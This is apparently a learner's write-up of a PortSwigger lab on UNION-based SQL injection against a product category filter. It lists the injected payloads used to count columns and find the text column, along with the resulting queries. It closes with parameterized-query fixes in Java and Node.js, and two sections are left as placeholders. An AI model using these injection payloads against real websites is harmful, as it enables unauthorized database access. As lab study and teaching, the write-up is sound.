# SQL injection UNION attack, finding a column containing text
## Goal: 
Determine the column whose data type is string.

## Lab details
Lab: SQL injection UNION attack, finding a column containing text

Level: Practitioner

Vulnerability Class: SQL Injection subtype: UNION-based

Lab URL: [\[PortSwigger lab link\]](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

Date Completed: 24-Jul-2026

Time to Solve: 30 mins

## Vulnerability Summary
The product category filter is vulnerable to SQL injection via UNION attack because the SQL query directly concatenates untrusted user input. This vulnerability enables retrieval of information such as data types and data from other database tables.

## Reconnaissance
Given that the lab identified the category filter as vulnerable to SQL injection, I performed the following reconnaissance steps:

1. Determine the number of columns to perform a UNION attack.
2. Identify the data types of the result set.
3. Inject the dynamically generated text string (created for each lab instance) into the UNION SELECT query.

## Exploitation — Step by Step
### Step 1: Determine the number of columns.
I used a UNION-based SELECT query to identify the number of columns in the main query.
```text
Gifts'union select null, null, null
```
Probable resulting SQL query:
```sql
SELECT name, description, price FROM products WHERE category = 'Gifts' UNION SELECT NULL, NULL, NULL --'
```
This query returned a 200 OK response, indicating that the main query contained three columns.


### Step 2: IDENTIFYING DATA TYPE OF THE RESULTSET
I systematically replaced each NULL value in the UNION SELECT statement to determine the data type of each column. When I replaced the first NULL with a string, it returned a 500 error. Replacing it with a number returned a 200 response. I subsequently identified that the second column accepts string data and the third column accepts numeric data, allowing me to construct the test query

```text
GGifts' union select 100, 'Test TEST', 50020 --
```
Probable resulting SQL query:
```sql
SELECT name, description, price FROM products WHERE category = 'Gifts' UNION SELECT 100, 'Test TEST', 50020 --'
```
This query returned a 200 OK response, confirming the data types of the result set.


### Step 3: Inject the dynamically generated string in the parameter query.
With the column count and data types identified, I injected the required text string into the appropriate column

```text
Gifts'union select 100, 'QsAik8', 50020 --
```
Probable resulting SQL query:
```sql
SELECT name, description, price FROM products WHERE category = 'Gifts' UNION SELECT 100, 'QsAik8', 50020 --'
```
This query displayed the required string on the screen, successfully completing the lab.


### Tools Used
 Manual (Burp Suite Repeater)

## The Fix
Never use string concatenation to build SQL queries
```java
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, userInput);
```
NodeJS
```js
const mysql = require('mysql2/promise');
const [rows] = await connection.execute('SELECT * FROM products WHERE category = ?', [category]);   
```


## Real-World Relevance
to-do

## Connections to My Own Projects
TBD

## Takeaway
Parameterized queries are the primary defense against SQL injection because they prevent user input from altering the structure of SQL statements.





